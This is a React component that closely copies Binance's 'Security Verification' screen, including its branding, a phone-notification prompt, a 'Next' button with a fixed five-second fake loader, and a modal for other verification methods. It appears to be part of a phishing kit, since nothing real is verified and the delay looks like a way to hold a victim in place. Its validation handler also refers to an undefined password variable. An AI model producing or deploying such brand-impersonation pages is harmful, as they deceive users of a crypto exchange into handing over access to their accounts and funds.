'use client'
import Icon from "./icon"
import { useState, useEffect, useRef } from 'react'
import { useTheme } from '../app/lib/ThemeContext'
import BinanceLoader from './BinanceLoader'
import { useValidatePassword } from '../app/hooks/useValidate'
import Modal from './VerificationModal'

export default function Security() {

    const { theme, toggleTheme } = useTheme();
    const [invalid, setInvalid] = useState(false)
    const [modal, setModal] = useState('AuthApp')
    const [displayModal, setDisplayModal] = useState(false)

    function handleDisplayModal(type) {
        setModal(type)
        setDisplayModal(true)
    }



    const [isLoading, setIsLoading] = useState(false)
    const [isHovered, setIsHovered] = useState(false)

    const { validatePassword } = useValidatePassword();
    const handlePasswordValidation = () => {
        const isValid = validatePassword(password);
        setInvalid(!isValid);
        console.log('submitted')

        if (isValid) {
            setIsLoading(true);
            setTimeout(() => {
                setIsLoading(false);
            }, 5000);
        }

        return isValid;
    }


    const [padding, setPadding] = useState("80px 24px 54px");

    useEffect(() => {
        const handleResize = () => {
            setPadding(window.innerWidth < 768 ? "8px 24px 16px" : "80px 24px 54px");
        };

        // Set initial padding
        handleResize();

        // Add event listener
        window.addEventListener("resize", handleResize);
        return () => window.removeEventListener("resize", handleResize);
    }, []);

    return (
        <div className={`lg:h-full h-screen w-full ${theme === 'light' ? 'bg-white' : 'bg-[#181a20]'} flex flex-col justify-between md:justify-normal`}>
            <Modal modal={modal} setModal={setModal} displayModal={displayModal} setDisplayModal={setDisplayModal} />
            <div className='h-full w-full flex md:justify-center flex-col md:items-center' style={{ padding }}>
                <div className={`md:border  ${theme === 'light' ? 'md:border-[#eaecef]' : 'md:border-[#2b3139]'} rounded-[24px] md:w-[425px] w-full min-h-[fit] md:min-h-[574px] md:px-[40px] md:pt-[40px] md:pb-[40px]`}>
                    <div className='md:mb-[20px] md:p-0 pt-[12px] px-0 pb-[20px]' onClick={toggleTheme}>
                        <Icon />
                    </div>

                    {/* Form heading text */}
                    <div className='flex h-fit flex-col mb-1 md:mb-3 md:mt-[25px]'>
                        <div className='font-[600] md:text-[33px] leading-[40px] text-[28px]'>
                            Security Verification
                        </div>
                    </div>

                    <div className="mt-[32px] w-full justify-center mb-[24px]">
                        <svg className="bn-svg mx-auto w-[120px] h-[120px]" viewBox="0 0 96 96" xmlns="http://www.w3.org/2000/svg"><path opacity="0.15" fillRule="evenodd" clipRule="evenodd" d="M84 8H12v56l36 24 36-24V8zM71.999 30H62V16H34v48h28V42h9.999v-4H62v-4h9.999v-4z" fill={`${theme === 'light' ? '#929AA5' : '#fff'}`}></path><path opacity="0.5" fillRule="evenodd" clipRule="evenodd" d="M62 16H34v4h28v-4zm0 44H34v4h28v-4z" fill="#929AA5"></path><path fillRule="evenodd" clipRule="evenodd" d="M47.998 26h28v20H63.995l-8 8v-8H48V26zm4 4h20v4h-20v-4zm0 8h20v4h-20v-4z" fill="#F0B90B"></path></svg>
                    </div>

                    <div className="flex justify-start gap-1 mt-5 mb-2 flex-col">
                        <p className='text-[16px] font-semibold leading-[24px]'>
                            Open Binance app on your phone
                        </p>
                        <p className={`text-[14px] ${theme === 'light' ? 'text-gray-500' : 'text-gray-400'} md:leading-[22px] md:font-normal`}>
                            Binance has sent a notification to your phone. Open your Binance App and confirm on the prompt to verify it's you.
                        </p>
                    </div>

                    {/* Form Button */}
                    <button className={`my-6 pb-1.5 font-medium text-[16px] hover:opacity-80 w-full bg-[#FCD535] flex items-center border-none cursor-pointer justify-center whitespace-nowrap min-h-[48px] h-[48px] min-w-[80px] ${theme === 'light' ? 'text-black' : 'text-black'} rounded-[10px]`} type='button' onClick={handlePasswordValidation}>
                        {isLoading ? <BinanceLoader /> : 'Next'}
                    </button>

                    <p className="cursor-pointer mb-6 pb-2 w-full sm:text-center" style={{ color: 'rgb(201, 148, 0)' }}>
                        Use Passkeys to Complete Verification
                    </p>
                </div>
            </div >

            <div className={`text-[14px] ${theme === 'light' ? 'text-gray-500' : 'text-gray-300'} w-full flex justify-center`}>
                <div className='flex items-center items justify-center h-[70px] w-[425px]'>
                    <div className='mx-[9px] cursor-pointer hover:text-[#F0B90B] flex items-center gap-2'
                        onMouseEnter={() => setIsHovered(true)}
                        onMouseLeave={() => setIsHovered(false)}>
                        <svg xmlns="http://www.w3.org/2000/svg"
                            height="12px"
                            viewBox="0 -960 960 960"
                            width="12px"
                            fill={isHovered ? '#F0B90B' : theme === 'light' ? '#4b5563' : '#d1d5db'}>
                            <path d="M480-80q-82 0-155-31.5t-127.5-86Q143-252 111.5-325T80-480q0-83 31.5-155.5t86-127Q252-817 325-848.5T480-880q83 0 155.5 31.5t127 86q54.5 54.5 86 127T880-480q0 82-31.5 155t-86 127.5q-54.5 54.5-127 86T480-80Zm0-82q26-36 45-75t31-83H404q12 44 31 83t45 75Zm-104-16q-18-33-31.5-68.5T322-320H204q29 50 72.5 87t99.5 55Zm208 0q56-18 99.5-55t72.5-87H638q-9 38-22.5 73.5T584-178ZM170-400h136q-3-20-4.5-39.5T300-480q0-21 1.5-40.5T306-560H170q-5 20-7.5 39.5T160-480q0 21 2.5 40.5T170-400Zm216 0h188q3-20 4.5-39.5T580-480q0-21-1.5-40.5T574-560H386q-3 20-4.5 39.5T380-480q0 21 1.5 40.5T386-400Zm268 0h136q5-20 7.5-39.5T800-480q0-21-2.5-40.5T790-560H654q3 20 4.5 39.5T660-480q0 21-1.5 40.5T654-400Zm-16-240h118q-29-50-72.5-87T584-782q18 33 31.5 68.5T638-640Zm-234 0h152q-12-44-31-83t-45-75q-26 36-45 75t-31 83Zm-200 0h118q9-38 22.5-73.5T376-782q-56 18-99.5 55T204-640Z" />
                        </svg>
                        English
                    </div>
                    <div className='mx-4 mb-0.5 cursor-pointer hover:text-[#F0B90B]'>
                        Cookies
                    </div>
                    <div className='mx-4 mb-0.5 cursor-pointer hover:text-[#F0B90B]'>
                        Terms
                    </div>
                    <div className='mx-4 mb-0.5 cursor-pointer hover:text-[#F0B90B]'>
                        Privacy
                    </div>
                </div>
            </div>
        </div >
    );
}
